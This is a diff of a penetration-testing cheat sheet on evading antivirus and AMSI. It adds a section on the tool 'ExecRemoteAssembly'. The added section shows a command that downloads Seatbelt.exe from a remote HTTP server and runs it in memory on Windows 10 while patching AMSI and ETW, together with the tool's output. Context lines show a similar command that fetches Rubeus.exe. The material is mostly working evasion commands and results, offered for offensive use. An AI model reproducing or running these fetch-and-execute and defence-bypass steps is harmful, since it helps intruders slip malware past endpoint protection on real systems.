@@ -18,8 +18,10 @@ II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (
      ➤ Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 
 III. Examples of techniques to download and execute in-memory offensive Portable Executable (PE) files (without using PowerShell) to bypass AV products
-     ➤ Example of AV & AMSI bypass using the tool 'FilelessRemotePE'
-     ➤ Example of AV & AMSI bypass using the tool 'EAPrimer'
+     ➤ Example of AV & AMSI bypass using the tool 'FilelessRemotePE'  	(it runs only C/C++/ASM based binaries)
+     ➤ Example of AV & AMSI bypass using the tool 'EAPrimer'		(it runs only .Net assemblies based on C#)
+     ➤ Example of AV & AMSI bypass using the tool 'ExecRemoteAssembly'  (it runs only .Net assemblies based on C#)
+
 
 
 ================================================================================================================================================
@@ -586,7 +588,7 @@ III. Examples of techniques to download and execute in-memory offensive Portable
 
 => Source: https://github.com/D1rkMtr/FilelessRemotePE
 
-The tool "FilelessRemotePE" allows to load remote Portable Executable (PE) files from URI directly into memory with:
+The tool "FilelessRemotePE" allows to load directly into memory remote Portable Executable (PE) files with:
 > argument passing
 > ETW patching
 > NTDLL unhooking
@@ -688,8 +690,8 @@ On startup, it will attempt to perform in-memory patching of AMSI to bypass dete
 By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.
 
 Reminder: 
-An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
-Assemblies take the form of executable (.exe) or dynamic link library (. dll) files, and are the building blocks of .NET applications.
+- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
+- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.
 
 
 Test/PoC - Download and execution in-memory of Rubeus.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
@@ -743,3 +745,94 @@ c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentlui
 
  <SNIP>
 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+3.3 Example of AMSI and AV bypass using the tool 'ExecRemoteAssembly'
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source: https://github.com/D1rkMtr/ExecRemoteAssembly
+
+This tool allows to download and execute directly into memeroy a remote .Net assembly with arguments passing and with AMSI and ETW patching.
+
+Limitaion: it can only run .NET assemblies that are based on C#.
+
+Reminder: 
+- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
+- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.
+
+
+Test/PoC - Download and execution in-memory of Seatbelt.exe on a Windows 10 with the MS Defender AV enabled and up-to-date
+-----------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Documents\Tools-AD\ExecRemoteAssembly-main> .\ExecRemoteNET.exe http://192.168.1.113:8081/seatbelt.exe -group=remote
+[-] Failed to load amsi.dll
+[+] Patched etw!
+[+] Patched amsi!
+[+] Patched amsi open session!
+ ~ Execute Remote .NET Assembly ~
+
+[+] Loading Remote PE from http://192.168.1.113:8081/seatbelt.exe
+[+] Bytes: 581632
+
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+                        &%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MpOav.dll"
+
+====== AntiVirus ======
+
+  Engine                         : Windows Defender
+  ProductEXE                     : windowsdefender://
+  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+====== DotNet ======
+
+  Installed CLR Versions
+      2.0.50727
+      4.0.30319
+
+  Installed .NET Versions
+      3.5.30729.4926
+      4.8.04084
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : False
+     .NET version support AMSI   : True
+        [!] The highest .NET version is enrolled in AMSI!
+====== ExplorerRunCommands ======
+
+
+  S-1-5-21-936125016-2310263949-2175806047-500 :
+    a          :  cmd\1
+    MRUList    :  akcmljifhgedb
+    b          :  services\1
+    c          :  mstsc\1
+    d          :  powershell\1
+    e          :  cmd.exe /c echo y\1
+    f          :  cmd /k ipconfig\1
+    g          :  gpedit.msc\1
+    h          :  cmd ipconfig\1
+    i          :  cmd /c ipconfig\1
+    j          :  ipconfig\1
+    k          :  notepad\1
+    l          :  cmd /kipconfig\1
+    m          :  calc\1
+====== Hotfixes ======
+<SNIP>
